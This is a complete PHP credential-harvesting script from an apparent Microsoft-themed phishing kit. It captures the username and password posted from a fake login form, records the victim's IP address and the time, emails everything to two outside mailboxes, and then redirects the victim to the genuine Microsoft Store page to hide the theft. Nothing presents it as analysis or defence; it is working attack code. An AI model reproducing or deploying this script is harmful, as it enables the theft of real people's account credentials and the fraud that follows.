<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$loginemail = $_POST['login'];
$password = $_POST['passwd'];

$message .= "+++++++++++ Microsoft Rez +++++++++++\n";
$message .="Username : $loginemail\n";
$message .="Password : $password\n";
$message .= "++++++++++++++++IP and Date+++++++++++++++\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "+++++++++++ Created By Don2020 +++++++++++\n";

$pfw_header = "From";
$pfw_subject = "Results Email";
$pfw_email_to = "birdie1012@yandex.com,kalilinux1012@gmail.com";
@mail($pfw_email_to, $pfw_subject ,$message ,$pfw_header ) ;
header("Location: https://www.microsoftstore.com/store/msusa/en_US/DisplayEditProfilePage/");
?>